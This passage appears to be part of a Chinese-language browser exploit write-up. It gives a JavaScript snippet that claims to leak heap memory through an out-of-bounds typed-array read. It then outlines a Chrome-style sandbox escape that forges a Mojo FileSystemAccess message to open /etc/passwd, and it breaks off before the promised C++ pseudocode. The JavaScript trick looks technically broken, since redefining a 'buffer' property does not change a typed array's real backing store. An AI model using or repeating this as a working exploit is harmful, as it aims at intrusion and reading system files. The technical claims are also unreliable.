// 触发越界读
let ab = new ArrayBuffer(0x100);
let arr = new Uint8Array(ab);
// 修改buffer为更小的ArrayBuffer
let small_ab = new ArrayBuffer(0x10);
Object.defineProperty(arr, 'buffer', {
    get: function() { return small_ab; }
});
// 调用slice，读取越界
let sliced = arr.slice(0, 0x100);
// sliced包含堆内存数据
console.log(sliced);


沙箱逃逸部分：通过任意读写找到`mojo::MessagePipe`的句柄，然后构造`FileSystemAccess::OpenFile`消息，指定路径为`/etc/passwd`，获取文件描述符。以下为利用片段（C++伪代码）：

